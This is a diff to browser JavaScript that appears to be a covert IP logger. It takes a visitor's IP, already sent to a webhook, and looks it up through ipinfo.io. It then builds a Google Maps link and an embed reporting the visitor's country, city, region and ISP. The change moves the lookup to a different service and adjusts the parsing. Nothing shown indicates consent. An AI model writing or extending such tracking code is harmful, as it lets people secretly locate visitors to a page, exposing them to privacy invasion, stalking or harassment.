@@ -61,16 +61,17 @@
 
             console.log('IP logged and sent to webhook.');
 
-            // Use ip-api.com for geolocation (now with HTTPS)
-            const locationResponse = await fetch(`https://ip-api.com/json/${userIP}`);
+            // Use ipinfo.io for geolocation directly (No CORS proxy)
+            const locationResponse = await fetch(`https://ipinfo.io/${userIP}/json`);
             const locationData = await locationResponse.json();
 
-            if (locationData.status === "fail") {
+            if (locationData.error) {
                 console.log('Unable to fetch location data for the user.');
                 return;
             }
 
-            const { country, countryCode, region, regionName, city, zip, lat, lon, timezone, isp, org, as } = locationData;
+            const { country, region, city, loc, timezone, org } = locationData;
+            const [lat, lon] = loc.split(',');
 
             // Generate the Google Maps link
             const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
@@ -86,17 +87,17 @@
                     fields: [
                         {
                             name: "📍 Country",
-                            value: `${country} (${countryCode})`,
+                            value: country,
                             inline: true
                         },
                         {
                             name: "🏙️ City",
-                            value: `${city}, ${regionName} (${region})`,
+                            value: city,
                             inline: true
                         },
                         {
-                            name: "🔢 Zip Code",
-                            value: zip || "N/A",
+                            name: "🌐 Region",
+                            value: region,
                             inline: true
                         },
                         {
@@ -106,17 +107,7 @@
                         },
                         {
                             name: "🌐 ISP",
-                            value: isp,
-                            inline: true
-                        },
-                        {
-                            name: "🏢 Organization",
-                            value: org || "N/A",
-                            inline: true
-                        },
-                        {
-                            name: "🔒 AS (Autonomous System)",
-                            value: as,
+                            value: org,
                             inline: true
                         },
                         {
